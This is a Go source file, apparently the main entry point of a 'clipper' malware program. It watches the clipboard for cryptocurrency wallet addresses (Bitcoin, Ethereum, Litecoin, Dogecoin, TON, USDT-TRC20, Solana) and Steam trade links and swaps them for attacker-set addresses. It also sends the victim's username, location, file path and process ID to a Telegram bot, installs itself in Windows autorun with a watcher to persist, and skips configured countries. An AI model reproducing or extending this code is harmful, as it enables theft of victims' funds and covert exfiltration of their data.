package main

import (
	"fmt"
	"os/user"
	"regexp"
	"syscall"

	"clipper/src/autorun"
	"clipper/src/clipper"
	"clipper/src/geoblock"
	"clipper/src/telegram"
	"clipper/src/utils"
)

var (
	btcRegex     = regexp.MustCompile(`^(?:bc1[ac-hj-np-z02-9]{25,90}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$`)
	ethRegex     = regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
	ltcRegex     = regexp.MustCompile(`^(?:ltc1[ac-hj-np-z02-9]{39,59}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,34})$`)
	dogeRegex    = regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$`)
	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9A-Za-z_-]{46,48}$`)
	usdttrcRegex = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
	steamTradeRegex = regexp.MustCompile(`(https?:\/\/)?steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+(&token=[\w\-]+)?`)
)

var (
	BtcAddr     string
	EthAddr     string
	LtcAddr     string
	DogeAddr    string
	TonAddr     string
	UsdtTrcAddr string
	SolAddr     string
	SteamAddr   string
)

var (
	bot_token   string
	chat_id     string
)

var (
	blockedGeos string
)

var matchers = []clipper.Matcher{
	{Regex: btcRegex, Addr: BtcAddr},
	{Regex: ethRegex, Addr: EthAddr},
	{Regex: ltcRegex, Addr: LtcAddr},
	{Regex: dogeRegex, Addr: DogeAddr},
	{Regex: tonRegex, Addr: TonAddr},
	{Regex: usdttrcRegex, Addr: UsdtTrcAddr},
	{Regex: solRegex, Addr: SolAddr},
	{Regex: steamTradeRegex, Addr: SteamAddr},
}

func main() {
	// we checking geo block
	geo := utils.GetGeo()
	geoblock.GeoBlock(blockedGeos, geo)

	// we checking addresses
	if BtcAddr == "" && EthAddr == "" && LtcAddr == "" && DogeAddr == "" && 
	   TonAddr == "" && UsdtTrcAddr == "" && SolAddr == "" && SteamAddr == "" {
		fmt.Println("No addresses configured. Please rebuild with proper addresses.")
		return
	}

	selfPath, _ := utils.GetSelfPath()
	selfName, _ := utils.GetSelfName()

	user, _ := user.Current()
	pid := syscall.Getpid()

	// send start log to telegram
	telegram.SendLog(fmt.Sprintf(
		"🟢 %s (%s)\n<code>%s</code>\nPID <code>%d</code>",
		user.Username,
		geo,
		selfPath,
		pid,
	), chat_id, bot_token)

	// we adding self to windows autorun
	_ = autorun.AddToAutorun(selfPath, selfName)

	// we starting main clipper process
	clipper.StartClipper(chat_id, bot_token, matchers, user.Username)

	// we starting autorun watcher
	autorun.StartWatcher(selfPath, selfName)

	select {}
}